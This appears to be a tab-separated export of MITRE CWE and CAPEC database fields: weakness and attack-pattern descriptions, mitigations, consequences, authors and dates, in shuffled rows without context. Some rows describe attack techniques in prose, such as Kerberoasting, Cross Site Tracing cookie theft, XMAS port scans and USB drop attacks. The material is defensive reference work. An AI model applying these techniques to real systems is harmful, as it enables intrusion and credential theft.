22744	50	Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.
23540	21	Anonymous Tool Vendor (under NDA)
18579	39	2012-10-30
11189	39	2011-09-13
11423	31	699
7080	66	EXP01-A. Do not take the sizeof a pointer to determine the size of a type
16160	39	2017-11-08
11193	43	Simple
25172	28	CWE Content Team
24112	91	Installation
8305	39	2013-07-17
11809	81	Confidentiality
19039	39	2010-02-16
17533	35	MITRE
6239	55	CAPEC Content Team
8892	31	1000
20196	39	2012-05-11
16584	28	CWE Content Team
15995	53	The MITRE Corporation
21107	26	Architecture and Design
15557	35	MITRE
16654	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).                   Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.
5754	43	Simple
20110	91	Implementation
17204	27	If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.
18756	45	Variant
16643	35	MITRE
23919	91	Implementation
10384	61	Draft
24553	72	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
17970	91	Architecture and Design
16012	62	updated Relationships
14790	51	2014-06-23
22773	103	Primary
22960	26	Implementation
19963	42	Where possible, use automated tools to enforce the standards.
19540	28	CWE Content Team
24466	73	The adversary connects the USB device to a specified target system or performs a USB Drop Attack, hoping a user will find and connect the USB device on his own. Once the device is connected, the malware executes giving the adversary access to network traffic, credentials, etc.
15199	73	Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.
20510	79	Access Control
17725	39	2008-07-01
5967	70	Analysis of Country-wide Internet Outages Caused by Censorship
21106	21	CWE Content Team
21271	39	2012-05-11
20667	42	Explicitly initialize the resource before use. If this is performed through an API function or standard procedure, follow all specified steps.
19919	39	2008-09-08
11387	28	CWE Content Team
21147	104	321
15600	74	3
21155	62	updated Common_Consequences, References
16821	90	Language-Independent
11941	35	MITRE
25354	28	CWE Content Team
12291	28	CWE Content Team
7737	62	updated References, Relationships, Type
7514	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Methods_of_Attack, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
18317	39	2017-11-08
11280	94	Attacks that leverage the principle of liking can lead to the target performing an action that results in a variety of consequences that negatively affect the confidentiality, availability, and/or integrity of an application or system.
25408	35	MITRE
19764	33	David Wheeler
24959	90	Language-Independent
23415	62	updated Relationships
21301	39	2018-03-27
9802	39	2017-11-08
16892	81	Access Control
17134	56	ChildOf
7697	23	This attack-focused weakness is caused by improperly implemented authentication schemes that are subject to spoofing attacks.
15269	74	3
24703	42	Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:                                                                  Encryption that is needed to store or transmit private data of the users of the system                         Encryption that is needed to protect the system itself from unauthorized disclosure or tampering                                                            Identify the separate needs and contexts for encryption:                                                                  One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the software) does not need to have access to a private key.                         Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.                                                            Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]
22893	62	updated Applicable_Platforms, Relationships
17461	39	2014-07-30
11573	23	An attacker inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device. Such attacks are very difficult to detect because the malicious code resides outside the filesystem or RAM, and in the underlying byte-code that drives the processor. Many devices, such as the recent attacks against digital picture frames, contain only a microprocessor and a small amount of solid-state memory, rendering these devices ideal for "flash" based malware or malicious logic. One of the pernicious characteristics of flash memory based attacks is that the malicious code can survive even a total format of the hard-drive and reinstallation of the host operating system. Virtually any device which can be integrated into a computer system is susceptible to these attacks. Additionally, any peripheral device which interfaces with the computer bus could extract or sniff confidential data, even on systems employing full-disk encryption. Trojan code placed into a video card's chipset would continue to perform its function irrespective of the host operating system, and would be invisible to all known antivirus. The threats extend to consumer products such as camcorders, digital cameras, or any consumer electronic device with an embedded microcontroller.
16292	63	Other
9346	61	Draft
20716	59	Updated Activation_Zone, Attack_Motivation-Consequences, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
19272	39	2011-06-01
12635	62	updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
23460	35	MITRE
10232	102	PeerOf
7358	28	CWE Content Team
11991	23	The software uses a signed primitive and performs a cast to an unsigned primitive, which can produce an unexpected value if the value of the signed primitive can not be represented using an unsigned primitive.
12624	35	MITRE
7096	39	2012-05-11
17997	28	Eric Dalci
24275	35	MITRE
6056	72	If the expired pointer is used in a read operation, an attacker might be able to control data read in by the application.
13885	101	CAPEC Content Team
23956	39	2014-07-30
25042	28	CWE Content Team
23849	101	CAPEC Content Team
8995	23	An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.
24464	103	Primary
15580	39	2014-07-30
6002	91	Architecture and Design
21586	85	537
23806	35	MITRE
24094	31	1000
8673	73	Common data typing. The attacker looks for common file signatures for well-known file types (JPEG, TIFF, ASN.1, LDIF, etc.). If the signatures match, he attempts decoding in that format.
16354	62	updated Relationships
18222	79	Access Control
6966	47	Execute Unauthorized Commands
10230	101	CAPEC Content Team
12818	36	https://www.securecoding.cert.org/confluence/display/seccode/FIO30-C.+Exclude+user+input+from+format+strings
11160	90	Language-Independent
24149	62	updated Potential_Mitigations
13701	43	Simple
22367	56	PeerOf
18475	62	updated Maintenance_Notes
8869	100	The MITRE Corporation
10399	31	1000
23652	63	DoS: Crash, Exit, or Restart
19620	49	2010
20689	45	Base
14947	62	updated Relationships, Taxonomy_Mappings
19692	23	An adversary uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the all flags sent in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. In addition to its relative speed when compared with other types of scans, its major advantage is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. XMAS scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems.
5854	91	Implementation
18958	62	updated Time_of_Introduction
18444	31	1000
25091	39	2012-05-11
14618	45	Variant
12832	39	2008-07-01
11726	35	MITRE
12679	28	CWE Content Team
10150	56	ChildOf
9487	62	updated References, Relationships
17867	56	ChildOf
19813	51	2014-06-23
15948	77	Manual Dynamic Analysis
21177	39	2011-06-01
24935	57	Indirect
6796	104	42
18221	100	The MITRE Corporation
15258	31	1000
11153	43	Simple
17479	62	updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
14373	28	Eric Dalci
20459	23	Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to destination system's web server. The adversary first gets a malicious script to run in the victim's browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the "document.cookie" object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable him or her to get around the same origin policy protection.
5867	39	2011-06-01
9159	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Inter-application Flow Analysis
12112	103	Primary
21518	35	MITRE
15843	35	MITRE
12096	28	CWE Content Team
13122	56	ChildOf
12823	28	CWE Content Team
14919	91	Architecture and Design
23474	31	1000
24405	62	updated Common_Consequences
11384	47	Read Data
9860	101	CAPEC Content Team
13647	62	updated Common_Consequences
21956	39	2008-09-08
11289	90	Java
16015	73	The attacker writes to files in different directories to check whether the application has sufficient checking before file operations.
18134	28	CWE Content Team
25007	24	MITRE
8891	88	Improper Null Termination
12811	50	Use a language or compiler that performs automatic bounds checking.
23727	46	On most systems, a combination of setting the SO_REUSEADDR socket option, and a call to bind() allows any process to bind to a port to which a previous process has bound with INADDR_ANY. This allows a user to bind to the specific address of a server bound to INADDR_ANY on an unprivileged port, and steal its UDP packets/TCP connection.
13085	35	MITRE
9916	50	Utilize side-channel resistant implementations of all crypto algorithms.
23322	73	Package listing. The attacker uses a package manifest provided with the software installer, or the filesystem itself, to identify component files suitable for attack.
21641	62	updated Common_Consequences
18564	99	ImmuniWeb
11076	103	Primary
19137	68	Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.
16660	28	CWE Content Team
13742	62	updated Related_Attack_Patterns
8418	88	Predictable Value Range from Previous Values
6916	89	Standard
19692	50	Employ a robust network defensive posture that includes a managed IDS/IPS.
15595	88	Information Exposure Through Sent Data
16271	28	CWE Content Team
7338	67	Medium
6947	43	Simple
16437	21	Anonymous Tool Vendor (under NDA)
9172	28	Eric Dalci
15288	56	ChildOf
11134	45	Base
11443	95	[Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.
14126	103	Primary
11845	72	If unique identifiers are assumed when protecting sensitive resources, then duplicate identifiers might allow attackers to bypass the protection.
24871	31	1000
7473	39	2008-09-08
7104	53	The MITRE Corporation
18342	103	Primary
17902	69	Incomplete
10186	43	Simple
17797	26	Architecture and Design
21136	92	Explore
22741	91	Implementation
21911	35	MITRE
7170	56	ChildOf
13807	28	CWE Content Team
6622	35	MITRE
9764	63	Gain Privileges or Assume Identity
25043	62	updated Relationships
13797	102	ChildOf
6749	39	2008-08-15
16640	39	2010-06-21
9100	52	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
7805	26	Implementation
20148	35	MITRE
20626	24	MITRE
8317	39	2008-07-01
18239	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
17125	69	Incomplete
10048	70	Session Riding: A Widespread Vulnerability in Today's Web Applications
15901	101	CAPEC Content Team
25369	45	Class
13812	103	Primary
13754	45	Class
22179	28	CWE Content Team
23869	39	2009-12-28
23944	79	Confidentiality
11544	28	CWE Content Team
24158	62	updated Related_Attack_Patterns
9496	81	Availability
16513	25	Low
21498	101	CAPEC Content Team
20142	62	updated Time_of_Introduction
18066	23	The software does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.
23168	69	Draft
23739	35	MITRE
24148	21	PLOVER
6076	35	MITRE
10680	72	A password authentication mechanism error will almost always result in attackers being authorized as valid users.
7582	62	updated Applicable_Platforms, Background_Details, Description, Relationships, Other_Notes, References, Taxonomy_Mappings
14231	35	MITRE
18461	73	Use modified client (modified by reverse engineering) to inject input.
12563	35	MITRE
19071	27	None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.
6152	35	MITRE
19133	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When dynamically constructing web pages, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.                   Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("<3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "<" character, which would need to be escaped or otherwise handled. In this case, stripping the "<" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.                   Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.                   Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.
23661	76	2015-12-07
19604	56	ChildOf
17199	28	CWE Content Team
6334	101	CAPEC Content Team
8083	40	The targeted site must contain hidden fields to be modified.
23675	28	CWE Content Team
17848	102	ChildOf
24908	46	Programmers typically catch NullPointerException under three circumstances:                                                The program contains a null pointer dereference. Catching the resulting exception was easier than fixing the underlying problem.                   The program explicitly throws a NullPointerException to signal an error condition.                   The code is part of a test harness that supplies unexpected input to the classes under test.                                          Of these three circumstances, only the last is acceptable.
9514	39	2011-06-27
14028	39	2012-05-11
24915	28	CWE Content Team
21725	33	David Wagner
18779	88	Improper Handling of Extra Parameters
10949	50	Design: Enforce principle of least privilege
24570	35	MITRE
23221	42	Enforce the use of strong mutual authentication mechanism between the two parties.
22233	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
19647	66	About rel=noopener
7418	39	2008-09-08
20739	57	Indirect
11991	43	Simple
15748	28	CWE Content Team
23548	62	updated Potential_Mitigations
12985	62	updated Common_Consequences
23026	28	CWE Content Team
18106	39	2010-09-27
9344	39	2008-11-24
9842	104	141
13881	31	1000
19610	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
9490	28	Sean Eidemiller
20193	78	Medium
7682	31	1003
9182	61	Draft
23817	45	Variant
22022	79	Integrity
7114	66	Input validation or output filtering, which is better?
10121	50	Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.
12957	28	CWE Content Team
7748	44	SOAR Partial
16910	28	CWE Content Team
23346	63	Modify Files or Directories
22150	40	The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).
7974	39	2013-02-21
7582	39	2008-09-08
15918	28	CWE Content Team
20925	35	MITRE
19809	79	Availability
15802	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
23083	77	Automated Static Analysis - Source Code
21857	43	Simple
20302	39	2008-09-08
13420	62	updated Common_Consequences, Relationships
19470	23	The software checks the status of a file or directory before accessing it, which produces a race condition in which the file can be replaced with a link before the access is performed, causing the software to access the wrong file.
24748	35	MITRE
13818	59	Updated Taxonomy_Mappings
13487	62	updated Potential_Mitigations
14585	62	updated Potential_Mitigations
15501	23	The documentation, whether on paper or in electronic form, does      not contain descriptions of all the relevant elements of the product, such as      its usage, structure, interfaces, design, implementation, configuration,      operation, etc.
9966	97	Buffer Manipulation
5891	34	This is often seen in web applications that assume that access to a particular CGI program can only be obtained through a "front" screen, when the supporting programs are directly accessible. But this problem is not just in web apps.
8568	92	Experiment
7948	77	Architecture or Design Review
13982	100	The MITRE Corporation
11234	35	MITRE
21145	79	Confidentiality
7338	105	Client Server
19853	51	2014-06-23
24798	105	Web Based
10675	55	CAPEC Content Team
17434	39	2010-12-13
8130	79	Availability
15399	33	Jason Lam
17840	28	CWE Content Team
9629	47	Read Data
21156	101	CAPEC Content Team
25273	23	The software contains a serializable, storable data element such as a field or member,      but the data element contains member elements that are not      serializable.
15042	50	Implementation: Use SSL/TLS to protect cookie in transit
8542	94	Blocking packets intended for a target IP address denies its availability to the user.
21061	92	Explore
13036	62	updated Relationships
11417	91	Implementation
23037	43	Simple
9552	57	Resultant
15793	62	updated Likelihood_of_Exploit, Taxonomy_Mappings
18254	56	ChildOf
10646	104	37
13721	35	MITRE
6566	62	updated Potential_Mitigations, References
17171	39	2014-07-30
23558	35	MITRE
23263	50	Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed.
12798	35	MITRE
10100	28	CWE Content Team
13772	76	2018-07-31
17495	28	CWE Content Team
18369	44	Limited
19479	81	Availability
21256	31	1000
16804	35	Cigital
11638	28	CWE Content Team
10884	35	MITRE
10891	45	Base
17215	39	2011-06-01
24226	26	Architecture and Design
23790	78	Very Low
12109	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
18805	55	CAPEC Content Team
23983	62	updated Relationships, Taxonomy_Mappings
20435	35	MITRE
11888	28	CWE Content Team
18522	40	The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system
12250	39	2014-07-30
22155	35	MITRE
22328	78	High
17893	39	2012-05-11
11358	62	updated Name
20081	69	Incomplete
10379	59	Updated Attack_Phases, References
11301	39	2011-06-01
15350	35	MITRE
14322	69	Draft
10295	35	MITRE
16904	79	Integrity
9234	79	Confidentiality
19708	35	MITRE
13766	39	2009-07-27
21459	62	updated Demonstrative_Examples
15962	74	5
6193	28	CWE Content Team
20720	28	CWE Content Team
17556	35	MITRE
16265	35	MITRE
20669	62	updated Relationships
12152	39	2017-11-08
17739	97	Network Topology Mapping
8303	58	Many functions will return some value about the success of their actions. This will alert the program whether or not to handle any errors caused by that function.
16745	28	CWE Content Team
15096	63	Reduce Reliability
23891	28	CWE Content Team
18386	39	2011-06-01
18778	62	updated Potential_Mitigations
13709	79	Confidentiality
18380	28	CWE Content Team
14008	26	Architecture and Design
13447	50	Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes.
10378	89	Detailed
18541	39	2012-05-11
5771	28	CWE Content Team
10110	31	1000
10720	28	CWE Content Team
14698	35	MITRE
6413	39	2012-05-11
14461	36	http://en.wikipedia.org/wiki/Decompiler
8034	59	Updated Attack_Phases
19661	28	Eric Dalci
8894	56	ChildOf
14816	25	High
24971	62	updated Applicable_Platforms
10366	91	Implementation
8391	62	updated Modes_of_Introduction, Relationships
6468	59	Updated Resources_Required
8299	35	MITRE
8449	28	CWE Content Team
20077	35	Cigital
21779	39	2008-09-08
22103	61	Draft
15268	28	CWE Content Team
17723	50	Monitor system and domain logs for abnormal credential access.
11336	63	Read Application Data
13305	94	Information Leakage
7290	35	MITRE
5802	90	C++
22863	39	2008-08-01
15934	76	2018-07-31
8332	28	CWE Content Team
12508	47	Hide Activities
5674	39	2014-06-23
16534	28	CWE Content Team
13323	50	Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.
17114	97	Hardware Component Substitution
21502	35	MITRE
21066	62	updated Common_Consequences, Relationships, Theoretical_Notes
15824	81	Integrity
13735	91	Operation
16780	94	Depending on the intention of the adversary, a successful SoundSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.
25125	21	CWE Content Team
19538	57	Primary
19969	39	2012-05-11
11573	85	458
18127	63	Alter Execution Logic
15278	43	Simple
9116	69	Draft
10763	55	CAPEC Content Team
9390	35	MITRE
22014	85	447
8655	45	Base
6376	76	2017-08-04
16994	42	Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. This is not necessarily a complete solution, since these canary-based mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application.
18378	43	Simple
10180	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
12572	62	updated Observed_Examples
12082	72	Incorrect sign conversions generally lead to undefined behavior, and therefore crashes.
12955	35	MITRE
7041	39	2015-12-07
15260	35	MITRE
20983	85	633
7845	88	Improper Export of Android Application Components
8596	81	Integrity
13915	43	Simple
10025	69	Incomplete
6935	35	MITRE
8054	28	CWE Content Team
24304	35	MITRE
22739	102	ChildOf
18345	62	updated Observed_Examples, References
8380	55	CAPEC Content Team
17203	35	MITRE
17190	47	Other
24130	35	MITRE
17441	35	MITRE
21205	74	2
18356	61	Draft
22910	39	2014-06-23
9386	39	2008-11-24
14326	72	Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
9576	97	Contradictory Destinations in Traffic Routing Schemes
24218	32	National Institute of Standards and Technology (NIST)
14200	35	MITRE
6308	35	MITRE
24482	62	updated Time_of_Introduction
5616	35	MITRE
23002	35	MITRE
13104	28	CWE Content Team
15845	26	Implementation
15712	62	updated Relationships
12447	62	updated Common_Consequences
14379	88	Inclusion of Functionality from Untrusted Control Sphere
23690	39	2011-06-01
20128	100	The MITRE Corporation
7991	97	Traffic Injection
10378	27	The attacker needs to have enough access to the target application to control the identity of a locally included PHP file.
11253	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
20241	28	CWE Content Team
18898	73	Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.
9219	72	In some cases it may be possible to force the software to "fail open" in the event of resource exhaustion. The state of the software -- and possibly the security functionality - may then be compromised.
10133	28	CWE Content Team
22518	44	SOAR Partial
8052	91	Operation
16398	104	686
16450	62	updated Relationships, Taxonomy_Mappings
21537	28	CWE Content Team
22498	39	2008-11-24
13554	35	CWE Team
7467	104	1074
6774	31	1000
21793	26	Implementation
11409	93	Defense in Depth
7465	100	The MITRE Corporation
17911	42	Always verify the integrity of the software that is being installed.
20146	35	MITRE
8013	28	CWE Content Team
15180	95	[Impersonate] An attacker can use successful experiments to impersonate an authorized user or system
20958	39	2011-06-01
6748	28	CWE Content Team
17397	35	MITRE
10229	62	updated Potential_Mitigations
11056	35	Cigital
7511	47	Gain Privileges
19468	28	CWE Content Team
16698	104	128
14286	76	2018-07-31
14198	31	1000
14629	91	Architecture and Design
13744	95	[Survey the Application to Identify User-controllable Inputs] The attacker surveys the target application to identify all user-controllable inputs, possibly as a valid and authenticated user
13756	77	Dynamic Analysis with Manual Results Interpretation
8367	62	updated Related_Attack_Patterns
23717	97	Manipulating Web Input to File System Calls
12361	103	Primary
12047	31	1003
19866	42	Use the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in your configuration of the Struts Validator. Example uses of the validator include checking to ensure that:                                                                  Phone number fields contain only valid characters in phone numbers                         Boolean values are only "T" or "F"                         Free-form strings are of a reasonable length and composition
9571	46	If the software chooses actions to take based on the file name, then if an attacker provides the data or resource fork, the software may take unexpected actions. Further, if the software intends to restrict access to a file, then an attacker might still be able to bypass intended access restrictions by requesting the data or resource fork for that file.
9050	62	updated Related_Attack_Patterns, Relationships
24391	62	updated Applicable_Platforms, Common_Consequences, Detection_Factors, Modes_of_Introduction, Relationships, Other_Notes, Research_Gaps, Taxonomy_Mappings, Weakness_Ordinalities
14015	47	Gain Privileges
10124	33	Ronen Heled
15112	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
22959	73	Determine which escape characters are accepted by the application/system. A common escape character is the backslash character, '\'
8397	23	Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.
8363	42	Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).
8097	59	Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, References, Related_Weaknesses
11399	57	Primary
7756	35	MITRE
9768	63	Other
18128	91	Documentation
15933	28	CWE Content Team
14665	62	updated Common_Consequences
17378	23	The adversary shapes the target's actions or behavior by focusing on the ways human interact and learn, leveraging such elements as cognitive and social psychology. In a variety of ways, a target can be influenced to behave or perform an action through capitalizing on what scholarship and research has learned about how and why humans react to specific scenarios and cues.
22552	35	MITRE
6503	39	2019-06-20
25323	39	2009-12-28
9719	62	updated Relationships, Taxonomy_Mappings
6133	35	MITRE
20291	62	updated Potential_Mitigations
22259	62	updated Relationships, Taxonomy_Mappings
22533	91	Architecture and Design
15302	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
6739	53	The MITRE Corporation
23511	76	2019-04-04
6355	39	2017-11-08
10037	31	1000
19968	90	Language-Independent
9749	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
19550	28	CWE Content Team
22033	28	CWE Content Team
14015	79	Confidentiality
9538	28	CWE Content Team
10280	92	Experiment
11587	35	MITRE
24232	40	A resource is expected to available to the user.
21290	79	Authorization
13211	35	MITRE
19070	88	Improper Neutralization of Macro Symbols
22069	63	Read Files or Directories
12204	39	2012-05-11
13280	91	Implementation
17296	39	2017-11-08
15681	43	Simple
23963	81	Access Control
10823	28	CWE Content Team
7231	45	Class
14848	35	MITRE
14288	45	Variant
8698	35	MITRE
24453	31	699
13526	28	CWE Content Team
14368	39	2010-12-13
15350	39	2009-10-29
16785	39	2017-01-19
17977	39	2010-09-27
13747	28	CWE Content Team
10010	35	MITRE
13795	39	2019-06-20
6454	59	Updated Resources_Required
23025	81	Integrity
6607	21	CLASP
5768	28	Eric Dalci
7862	42	A certificate binds an identity to a cryptographic key to authenticate a communicating party. Often, the certificate takes the encrypted form of the hash of the identity of the subject, the public key, and information such as time of issue or expiration using the issuer's private key. The certificate can be validated by deciphering the certificate with the issuer's public key. See also X.509 certificate signature chains and the PGP certification structure.
17407	57	Indirect
20298	85	113
6540	35	MITRE
8531	91	Build and Compilation
8388	39	2009-07-27
17312	104	682
10752	35	MITRE
23996	56	ChildOf
13399	59	Updated References
18858	63	Modify Application Data
16624	61	Stable
12772	91	Implementation
9910	28	CWE Content Team
15539	39	2009-05-27
21094	62	updated Relationships
6811	62	updated Relationships, Taxonomy_Mappings
13617	35	MITRE
15215	62	updated Relationships, Other_Notes, Taxonomy_Mappings
25006	81	Integrity
18700	28	CWE Content Team
